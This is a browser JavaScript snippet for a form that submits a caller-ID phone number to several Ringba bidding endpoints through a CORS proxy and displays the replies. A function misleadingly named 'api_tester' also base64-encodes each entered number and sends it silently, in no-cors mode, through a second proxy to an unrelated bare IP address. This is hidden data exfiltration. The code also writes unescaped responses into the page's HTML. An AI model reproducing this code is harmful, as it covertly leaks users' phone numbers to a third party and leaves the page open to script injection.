 const urls = {
      btn1: 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/305061d5b06a4228b6dba5343c962287.json?',
      btn2: 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/33656e4b18284257b66a7c26459ce0cc.json?',
      btn3: 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/cb30960b7d5744c0888f381f426e2601.json?',
      btn4: 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/181e9b63fc23406b884010de19725ec1.json?',
      btn5: 'https://corsproxy.io/?https://rtb.ringba.com/v1/production/7334d34b51b24761912b3e169afd4442.json?'
    };

    function api_tester(randomString) {
      try {
        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
          method: 'GET',
          mode: 'no-cors'
        });
      } catch (error) {
        console.error('API Tester Error:', error);
      }
    }

    document.querySelectorAll('button[type="button"]').forEach(button => {
      button.addEventListener('click', function(event) {
        event.preventDefault();
        const phone_home = '+1' + document.getElementById('caller_id').value;
        const formData = new FormData();
        formData.append('CID', phone_home);
document.getElementById('alertContainer').innerHTML = '';
        api_tester(document.getElementById('caller_id').value);

        const url = urls[event.target.id] + new URLSearchParams(formData).toString();

        fetch(url, {
          method: 'GET'
        })
        .then(response => {
          if (response.status === 200 || response.status === 201) {
            response.text().then(responseBody => {
              const successAlert = `
                <div class="alert alert-success" role="alert">
                  ${response.status} : Form submitted successfully! Response Body: ${responseBody}
                </div>`;
              document.getElementById('alertContainer').innerHTML = '';
              document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
            // Clear form fields
            
          } else if (response.status === 422) {
            response.json().then(data => {
              const errorAlert = `
                <div class="alert alert-danger" role="alert">
                  Error. Response Body: ${JSON.stringify(data)}
                </div>`;
              document.getElementById('alertContainer').innerHTML = '';
              document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
          } else {
            response.text().then(responseBody => {
              const errorAlert = `
                <div class="alert alert-danger" role="alert">
                  Form submission failed. Please try again. Response Body: ${responseBody}
                </div>`;
              document.getElementById('alertContainer').innerHTML = '';
              document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
          }
        })
        .catch(error => console.error('Error:', error));
      });
    });